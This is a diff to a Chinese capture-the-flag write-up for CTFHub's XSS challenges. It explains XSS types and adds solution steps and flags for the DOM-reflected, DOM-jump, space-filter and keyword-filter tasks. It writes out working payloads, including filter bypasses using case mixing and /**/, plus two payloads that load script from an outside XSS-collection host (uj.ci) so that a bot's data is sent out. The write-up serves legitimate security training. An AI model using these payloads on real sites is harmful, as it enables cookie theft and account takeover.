@@ -59,7 +59,7 @@ description: CTFHub-技能树-XSS
 
 ## XSS学习
 
-### XSS定义
+### XSS
 
 - XSS（Cross Site Scripting）跨站脚本攻击：恶意攻击者利用web页面的漏洞，插入一些恶意代码，当用户访问到页面的时候，代码就会被执行，从而达到攻击的目的。
 - XSS攻击载体：JavaScript、Java、VBScript、Flash、ActiveX等。
@@ -69,14 +69,14 @@ description: CTFHub-技能树-XSS
 
 - 非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。
 - 反射型XSS攻击流程：
-  [反射型XSS攻击流程.jpg](反射型XSS攻击流程.jpg)
+  ![反射型XSS攻击流程.jpg](反射型XSS攻击流程.jpg)
 - 数据流向是： 前端-->后端-->前端
   
 #### 存储型XSS
 
 - 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，其他用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。
 - 存储型XSS攻击流程：
-  [存储型XSS攻击流程.jpg](存储型XSS攻击流程.jpg)
+  ![存储型XSS攻击流程.jpg](存储型XSS攻击流程.jpg)
 - 数据流向是：前端-->后端-->数据库-->后端-->前端
 
 #### DOM反射型XSS
@@ -151,61 +151,100 @@ ctfhub{444ad0fcba38ed2e9da18d9d}
 
 #### 解题过程
 
+- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，页面并没有弹出，查看网页源码，发现</script>闭合了：
+  ![](wp-DOM反射-1.png)
+- 换一个payload，输入`<img src=1 onerror=alert(1)>`，点击提交，页面弹出`1`，说明存在DOM反射XSS漏洞：
+  ![](wp-DOM反射-2.png)
+- 第一个输入框中也可以输入构造包含script标签的payload，及提前闭合script标签的payload，例如`</script><script>alert(1)</script>`，都可以成功触发XSS漏洞：
+  ![](wp-DOM反射-3.png)
+- 第二个输入框输入基于XSS平台提供的payload构造的url，让bot机器触发XSS，XSS平台成功接收到数据：
+  ![](wp-DOM反射-4.png)
+
+
 #### FLAG
   
 ```plaintext
+ctfhub{824bae1b53917ae969fa7d84}
 ```
 
 #### 参考
 
-- 参考：
-  - [CTFHub XSS DOM反射 WriteUp_ctfhub的xss反射-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131545561)
+- [CTFHub XSS DOM反射 WriteUp_ctfhub的xss反射-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131545561)
+- [InnerHTML属性的XSS利用_innerhtml xss-CSDN博客](https://blog.csdn.net/weixin_43825028/article/details/119112234)
 
 ### DOM跳转
 
 #### 解题过程
 
+- 查看网页源码，发现一段javascript代码：
+  ```js
+  <script>
+    var target = location.search.split("=")
+    if (target[0].slice(1) == "jumpto") {
+        location.href = target[1];
+    }
+  </script>
+  ```
+- 这段代码的作用是：如果url中包含`jumpto`参数，就跳转到`jumpto`参数指定的url
+- 使用javascript伪协议构造payload`?jumpto=javascript:alert(1)`，拼接url并访问，页面弹出`1`，说明存在DOM跳转XSS漏洞：
+  ![](wp-DOM跳转-1.png)
+- 使用jQuery的`$.getScript()`函数来异步加载并执行来自xss平台的js脚本，构造出来的payload为`?jumpto=javascript:$.getScript('//uj.ci/l62')`
+- 第二个输入框输入构造的url，点击发送，让bot机器触发XSS，XSS平台成功接收到数据：
+  ![](wp-DOM跳转-2.png)
+
 #### FLAG
   
 ```plaintext
+ctfhub{133fda97d6991a94aedc3495}
 ```
 
 #### 参考
-
-- jumpto
-- 参考：
-  - [CTFHub XSS DOM跳转 WriteUp_xss dom jumpto ?-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546660)
+- [CTFHub XSS DOM跳转 WriteUp_xss dom jumpto ?-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546660)
+- [珂技系列之一篇就够了——XSS进阶 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/262013.html)
+- [XSS篇——javascript:伪协议_js伪协议-CSDN博客](https://www.cnblogs.com/song-song/p/5277838.html)
 
 ### 过滤空格
 
 #### 解题过程
 
+- 第一个输入框中输入`<script>alert('1  1')</script>`，点击提交，弹出框中显示`11`，说明空格被过滤了：
+  ![](wp-过滤空格-1.png)
+- 使用`/**/`绕过空格过滤
+- 基于XSS平台提供的payload，构造payload为`<sCRiPt/**/sRC=//uj.ci/l62></sCrIpT>`，拼接url
+- 第二个输入框输入构造的url，点击发送，让bot机器触发XSS，XSS平台成功接收到数据：
+  ![](wp-过滤空格-2.png)
+
 #### FLAG
   
 ```plaintext
+ctfhub{2f8b7263db5a198dc1179092}
 ```
 
 #### 参考
 
-- XSS过滤空格绕过可以使用`/**/`等
-- 参考：
-  - [CTFHub | 过滤空格_ctfhub过滤空格-CSDN博客](https://blog.csdn.net/m0_51191308/article/details/128172056)
-  - [XSS绕过方法总结_xss空格过滤绕过-CSDN博客](https://blog.csdn.net/xinyue9966/article/details/121099189)
+- [CTFHub | 过滤空格_ctfhub过滤空格-CSDN博客](https://blog.csdn.net/m0_51191308/article/details/128172056)
+- [XSS绕过方法总结_xss空格过滤绕过-CSDN博客](https://blog.csdn.net/xinyue9966/article/details/121099189)
 
 
 ### 过滤关键词
 
 #### 解题过程
 
+- 第一个输入框中输入`<script>alert(1)</script>`，点击提交，发现`script`关键词被过滤了：
+  ![](wp-过滤关键词-1.png)
+- XSS过滤关键词绕过可以使用双写、大小写等方式，例如`<scRipt>alert(1)</scriPt>`，点击提交，发现`1`被弹出，说明存在XSS漏洞：
+  ![](wp-过滤关键词-2.png)
+- 第二个输入框输入基于XXS平台提供的payload构造的url，让bot机器触发XSS，XSS平台成功接收到数据：
+  ![](wp-过滤关键词-3.png)
+
 #### FLAG
   
 ```plaintext
+ctfhub{6018e7897d2baa06f2a89eaa}
 ```
 
 #### 参考
 
-- XSS过滤关键词绕过可以使用双写、大小写等方式
-- 参考：
-  - [CTFHub XSS 过滤关键词 WriteUp_ctfhub过滤关键字xss-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546199)
+- [CTFHub XSS 过滤关键词 WriteUp_ctfhub过滤关键字xss-CSDN博客](https://blog.csdn.net/weixin_49125123/article/details/131546199)
 
 
